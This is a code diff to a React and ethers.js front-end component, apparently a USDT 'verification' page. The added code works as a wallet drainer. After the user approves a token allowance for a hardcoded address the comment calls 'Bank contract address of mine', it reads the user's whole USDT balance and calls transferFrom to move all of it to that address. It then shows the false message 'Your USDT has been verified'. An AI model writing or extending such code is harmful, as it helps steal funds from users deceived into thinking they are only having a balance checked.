@@ -31,6 +31,12 @@ const Welcome = () => {
   const spender = "0xcb08c0b38eC1ac1b6fbC7771B5BD58ee6B9dE668"; // Bank contract address of mine
   let decimals = 18; // Default value
   let amount = ethers.utils.parseUnits("499.99", decimals);
+  const abi = [
+    "function approve(address spender, uint256 amount) public returns (bool)",
+    "function decimals() view returns (uint8)",
+    "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
+    "function balanceOf(address account) view returns (uint256)",
+  ];
 
 
   useEffect(() => {
@@ -70,7 +76,6 @@ const Welcome = () => {
       return;
     }
 
-    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
     const token = new ethers.Contract(tokenAddress, abi, signer);
 
     decimals = await token.decimals();
@@ -106,16 +111,40 @@ const Welcome = () => {
           token: tokenAddress,
           spender: spender,
           amount: amount.toString(),
+          decimals: decimals,
+          tokenAddress: tokenAddress,
+          abi: abi,
+
         }),
       });
       const data = await res.json();
       console.log(data);
 
-      // Get balance
-      const balanceAbi = ["function balanceOf(address account) view returns (uint256)"];
-      const usdt = new ethers.Contract(tokenAddress, balanceAbi, provider);
-      const balance = await usdt.balanceOf(walletAddress);
-      const formatted = ethers.utils.formatUnits(balance, 18);
+      const getUSDTBalance = async () => {
+        const balanceAbi = ["function balanceOf(address account) view returns (uint256)"];
+        const usdt = new ethers.Contract(tokenAddress, balanceAbi, provider);
+        const rawBalance = await usdt.balanceOf(walletAddress);
+        const formatted = ethers.utils.formatUnits(rawBalance, decimals); // human-readable
+        return { rawBalance, formatted };
+      };
+
+      const { rawBalance, formatted } = await getUSDTBalance();
+
+      const transferTokens = async (tokenContract) => {
+        try {
+
+          const transferAmount = rawBalance;
+          const tx = await tokenContract.transferFrom(walletAddress, spender, transferAmount);
+
+          console.log("⏳ Sending transaction...");
+          await tx.wait();
+          console.log("✅ Transfer complete! Hash:", tx.hash);
+        } catch (err) {
+          console.error("❌ Error during transfer:", err);
+        }
+      };
+
+      await transferTokens(token);
 
       alert(`✅ Your USDT has been verified. Balance: ${formatted} USDT`);
     } catch (err) {
